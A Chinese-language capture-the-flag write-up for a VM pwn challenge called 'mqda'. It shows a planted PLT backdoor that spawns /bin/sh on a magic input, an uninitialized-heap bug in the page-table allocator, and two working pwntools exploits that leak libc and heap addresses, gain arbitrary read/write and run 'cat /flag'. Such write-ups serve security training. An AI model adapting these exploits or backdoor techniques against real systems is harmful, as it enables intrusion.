# mqda wp

## 0x01 后门

```
.plt:00000000000010B0                               ; __int64 __fastcall sub_10B0(_QWORD, _QWORD, _QWORD)
.plt:00000000000010B0                               sub_10B0 proc near                      ; CODE XREF: sub_1870+79↓p
.plt:00000000000010B0                                                                       ; sub_1870+B0↓p
.plt:00000000000010B0                                                                       ; sub_1870+1AF↓p
.plt:00000000000010B0 E9 E0 14 00 00                jmp     near ptr 2595h
.plt:00000000000010B0
.plt:00000000000010B0                               sub_10B0 endp
.plt:00000000000010B0
.plt:00000000000010B0                               ; ---------------------------------------------------------------------------
.plt:00000000000010B5 90                            align 2
```

发现plt表部分被篡改

```
.fini:0000000000002588
.fini:0000000000002588                               public _term_proc
.fini:0000000000002588                               _term_proc proc near
.fini:0000000000002588 F3 0F 1E FA                   endbr64
.fini:000000000000258C 48 83 EC 08                   sub     rsp, 8
.fini:0000000000002590 48 83 C4 08                   add     rsp, 8
.fini:0000000000002594 C3                            retn
.fini:0000000000002594
.fini:0000000000002594                               _term_proc endp
.fini:0000000000002594
.fini:0000000000002594                               _fini ends
.fini:0000000000002594
.rodata:0000000000003000                               ; ===========================================================================
.rodata:0000000000003000
.rodata:0000000000003000                               ; Segment type: Pure data
.rodata:0000000000003000                               ; Segment permissions: Read
.rodata:0000000000003000                               _rodata segment dword public 'CONST' use64
.rodata:0000000000003000                               assume cs:_rodata
.rodata:0000000000003000                               ;org 3000h
.rodata:0000000000003000 01                            unk_3000 db    1                        ; DATA XREF: LOAD:0000000000000130↑o
.rodata:0000000000003001 00                            db    0
.rodata:0000000000003002 02                            db    2
```

但是跳转位置是0x2595，不属于任何section的加载部分，但是按照elf文件的加载特性，这部分地址会被加载至内存中，可以通过调试的方式确定内存中的内容

```bash
pwndbg> x /32i $rebase(0x2595)
   0x555555556595:      push   rdi
   0x555555556596:      mov    rdi,QWORD PTR [rdi]
   0x555555556599:      cmp    rdi,0x33892321
   0x5555555565a0:      je     0x5555555565aa
   0x5555555565a2:      pop    rdi
   0x5555555565a3:      cs jmp QWORD PTR [rip+0x2a96]        # 0x555555559040 <strtol@got.plt>
   0x5555555565aa:      xor    rsi,rsi
   0x5555555565ad:      push   rsi
   0x5555555565ae:      movabs rdi,0x68732f2f6e69622f
   0x5555555565b8:      push   rdi
   0x5555555565b9:      push   rsp
   0x5555555565ba:      pop    rdi
   0x5555555565bb:      push   0x3b
   0x5555555565bd:      pop    rax
   0x5555555565be:      cdq
   0x5555555565bf:      syscall
```

发现是一个syscall，如果输入的值是0x33892321则调用后门，反之则正常执行strtol函数，exp如下

```python
from pwn import *

context.log_level = "debug"

def exp1(ip:str, port:int):
    try:
        p = remote(ip, port)
        p.recvuntil(b"> ")
        p.send(b"\x21\x23\x89\x33")
        p.recv(timeout=1)
        p.sendline("cat /flag")
        return p.readline().strip()
    except:
        try:
            p.close()
        except:
            pass
        return None

if __name__ == "__main__":
    exp1("127.0.0.1", 39999)
```



## 未初始化漏洞

发现用于分配页表的`sub_1370`函数在多级页表的初始化过程中调用了`malloc`函数但是未对堆块进行初始化

```c
_DWORD *__fastcall sub_1370(_QWORD *a1, unsigned int a2)
{
  unsigned int v2; // ebx
  _QWORD *v3; // r13
  __int64 v4; // rbp
  _QWORD *v5; // r12
  char *v6; // rax
  char *v7; // rbp
  _DWORD *result; // rax
  __int64 v9; // r12
  __int64 v10; // rdx
  _QWORD *v11; // rax
  _QWORD *v12; // rax

  v2 = a2;
  v3 = (_QWORD *)*a1;
  if ( *a1 )
  {
    v4 = HIBYTE(a2);
    v5 = (_QWORD *)v3[v4];
    if ( v5 )
      goto LABEL_3;
  }
  else
  {
    v11 = malloc(0x800uLL);
    *a1 = v11;
    v3 = v11;
    if ( !v11 )
      goto LABEL_11;
    v4 = HIBYTE(a2);
    v5 = (_QWORD *)v11[v4];
    if ( v5 )
      goto LABEL_3;
  }
  v12 = malloc(0x800uLL);
  v3[v4] = v12;
  v5 = v12;
  if ( !v12 )
    goto LABEL_11;
LABEL_3:
  v6 = (char *)v5[BYTE2(a2)];
  if ( !v6 )
  {
    v6 = (char *)malloc(0x800uLL);
    v5[BYTE2(a2)] = v6;
    if ( !v6 )
      goto LABEL_11;
  }
  v7 = &v6[8 * BYTE1(a2)];
  result = *(_DWORD **)v7;
  if ( !*(_QWORD *)v7 )
  {
    v9 = qword_58D0;
    if ( (unsigned __int64)qword_58D0 > 0x100 )
    {
      puts("too many pages!");
      goto LABEL_11;
    }
    LOBYTE(v2) = 0;
    result = malloc(0x104uLL);
    v10 = 0LL;
    *(_QWORD *)v7 = result;
    *result = v2;
    while ( qword_50C0[v10] )
    {
      if ( ++v10 == 256 )
      {
        qword_58D0 = v9 + 1;
        return result;
      }
    }
    qword_50C0[v10] = result;
    result = *(_DWORD **)v7;
    qword_58D0 = v9 + 1;
    if ( !result )
LABEL_11:
      exit(-1);
  }
  return result;
}
```

造成的问题是堆块中本身存在的`main_arena`地址会被误用为页内存地址，从而造成越界读写，exp如下

```python
from pwn import *

context.log_level = "debug"

local=0
aslr=True

p = None

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s):
    print('\033[1;31;40m{s}\033[0m'.format(s=s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))


R = 0
RR = 1
RV = 2
LR = 3
RL = 4

def TERM():
    return b'\x00'

def MOV(MD, V1=b'', V2=b''):
    OPM = 1 | (MD << 5)
    res = OPM.to_bytes(1, "little", signed=False) + V1 + V2
    print(res.hex())
    return res

def PUSH(MD, V1=b''):
    OPM = 2 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def POP(MD, V1=b''):
    OPM = 3 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def ADD(MD, V1=b'', V2=b''):
    OPM = 4 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def SUB(MD, V1=b'', V2=b''):
    OPM = 5 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def MUL(MD, V1=b'', V2=b''):
    OPM = 6 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def DIV(MD, V1=b'', V2=b''):
    OPM = 7 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def NOT(MD, V1=b''):
    OPM = 8 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def XOR(MD, V1=b'', V2=b''):
    OPM = 9 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def OR(MD, V1=b'', V2=b''):
    OPM = 10 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def SHL(MD, V1=b'', V2=b''):
    OPM = 11 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def SHR(MD, V1=b'', V2=b''):
    OPM = 12 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def TEST(MD, V1=b'', V2=b''):
    OPM = 13 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def JMP(MD, V1=b''):
    OPM = 14 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def JA(MD, V1=b''):
    OPM = 15 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JAE(MD, V1=b''):
    OPM = 16 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JB(MD, V1=b''):
    OPM = 17 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JBE(MD, V1=b''):
    OPM = 18 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JE(MD, V1=b''):
    OPM = 19 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JNE(MD, V1=b''):
    OPM = 20 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def ARW(RA, RB, R0, R1):
    EXP = b''
    EXP += MOV(RV, p8(2), p32(0x40330 - 4))
    EXP += MOV(LR, p8(2), p8(RA))

    EXP += MOV(RV, p8(2), p32(0x40330))
    EXP += MOV(LR, p8(2), p8(RB))

    EXP += MOV(RV, p8(2), p32(0x40400))
    EXP += MOV(LR, p8(2), p8(R0))

    EXP += MOV(RV, p8(2), p32(0x40404))
    EXP += MOV(LR, p8(2), p8(R1))

    return EXP

def ARR(RA, RB, R1, R2):
    EXP = b''

    EXP += MOV(RR, p8(1), p8(RA))
    EXP += MOV(RV, p8(2), p32(0x40330 - 4))
    EXP += MOV(LR, p8(2), p8(1))

    EXP += MOV(RR, p8(1), p8(RB))
    EXP += MOV(RV, p8(2), p32(0x40330))
    EXP += MOV(LR, p8(2), p8(1))

    EXP += MOV(RV, p8(2), p32(0x40400))
    EXP += MOV(RL, p8(R1), p8(2))

    EXP += MOV(RV, p8(2), p32(0x40404))
    EXP += MOV(RL, p8(R2), p8(2))

    return EXP


def exp2(ip:str, port:int):
    global p
    try:
        p = remote(ip, port)

        EXP = b''
        
        EXP += MOV(RV, p8(1), p32(0x1234))
        for i in range(0x100, 0x120):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(1), p32(0))
        for i in range(0x108, 0x11f):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(1), p32(0x5678))
        for i in range(0x108, 0x108+7):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(2), p32(0x11004))
        EXP += MOV(RL, p8(3), p8(2)) # libc low
        EXP += MOV(RV, p8(2), p32(0x11008))
        EXP += MOV(RL, p8(4), p8(2)) # libc high
    
        EXP += MOV(RV, p8(5), p32(0x1fd120+0x1d1e0)) # libc offset
        EXP += SUB(RR, p8(3), p8(5))
    
        EXP += MOV(RV, p8(2), p32(0x1100c))
        EXP += MOV(RL, p8(6), p8(2)) # heap low
        EXP += MOV(RV, p8(2), p32(0x11010))
        EXP += MOV(RL, p8(7), p8(2)) # heap high
    
        EXP += MOV(RV, p8(8), p32(0x3650+0x220)) # heap offset
        EXP += SUB(RR, p8(6), p8(8))
       
        # Use out all bins
        EXP += MOV(RV, p8(1), p32(0xaaaa))
        for i in range(0x230, 0x238):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        # Prepare Arbitrary Write
        EXP += MOV(RV, p8(1), p32(0xbbbb))
        for i in range(0x300, 0x320):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
        EXP += MOV(RV, p8(1), p32(0))
        for i in range(0x300, 0x308 + 7 + 1):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(1), p32(0xcccc))
        EXP += MOV(RV, p8(2), p32(0x43000))
        EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(9), p32(0x262a80 - 4))
        EXP += ADD(RR, p8(3), p8(9))
        EXP += ARR(3, 4, 10, 11)
        EXP += ARR(3, 4, 14, 15)
    
        EXP += MOV(RV, p8(12), p32(0x5040 - 4))
        EXP += ADD(RR, p8(10), p8(12))
    
        EXP += MOV(RV, p8(1), p32(0x211d20-4))
        EXP += SUB(RR, p8(3), p8(1))
    
        EXP += ARW(10, 11, 3, 4)
    
        EXP += MOV(RV, p8(12), p32(0x1270))
        EXP += ADD(RR, p8(14), p8(12))
    
        EXP += MOV(RV, p8(12), p32(0x5040 - 0x5008))
        EXP += SUB(RR, p8(10), p8(12))
    
        EXP += ARW(10, 11, 14, 15)
    
        pause()
    
        ru("Address> ")
        sl(str(0x1000))
        ru("Length> ")
        sl(str(len(EXP)))
        ru("Code> ")
        sn(EXP)
        ru("IP> ")
        sl(str(0x1000))
    
        ru("Address> ")
        sn('/bin/sh\x00')
        sl("cat /flag")
        return rl().strip()

    except:
        __import__("traceback").print_exc()
        try:
            p.close()
        except:
            pass
        return None


if __name__ == '__main__':
    exp2("127.0.0.1", 39999)

```

